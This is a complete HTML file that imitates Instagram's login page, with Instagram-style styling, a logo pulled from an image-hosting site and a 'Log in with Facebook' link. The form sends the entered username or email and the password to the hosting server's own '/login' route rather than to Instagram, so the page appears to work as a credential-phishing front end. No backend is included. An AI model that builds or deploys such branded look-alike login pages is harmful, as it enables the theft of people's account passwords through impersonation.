<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Arial', sans-serif;
        }

        .login-container {
            width: 100%;
            max-width: 350px;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .login-logo {
            margin: 20px auto;
            width: 175px;
        }

        .form-control {
            margin-bottom: 10px;
            border-radius: 4px;
            font-size: 14px;
            padding: 10px;
        }

        .btn-login {
            background-color: #0095f6;
            color: #fff;
            border: none;
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border-radius: 4px;
            margin-top: 10px;
            cursor: pointer;
        }

        .btn-login:disabled {
            background-color: #b2dffc;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            margin-right: 10px;
        }

        .divider::after {
            margin-left: 10px;
        }

        .btn-facebook {
            background-color: transparent;
            color: #385185;
            font-size: 14px;
            border: none;
            margin-top: 10px;
            cursor: pointer;
        }

        .forgot-password {
            color: #385185;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }

        @media (max-width: 576px) {
            .login-container {
                margin: 20px;
                border: none;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://i.postimg.cc/9fH7CBWY/images.png" alt="Instagram" class="login-logo">
        <form action="/login" method="POST">
            <input type="text" name="email" class="form-control" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" class="form-control" placeholder="Password" required>
            <button type="submit" class="btn-login" disabled>Log In</button>
        </form>
        <div class="divider">OR</div>
        <button class="btn-facebook" onclick="window.location.href='/fb'">
            <i class="fab fa-facebook-square"></i> Log in with Facebook
        </button>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>
</body>
<script>
    // Enable the login button only if both fields are filled
    document.querySelectorAll('.form-control').forEach(input => {
        input.addEventListener('input', () => {
            const username = document.querySelector('input[name="email"]').value;
            const password = document.querySelector('input[name="password"]').value;
            const button = document.querySelector('.btn-login');
            button.disabled = !(username && password);
        });
    });
</script>
</html>
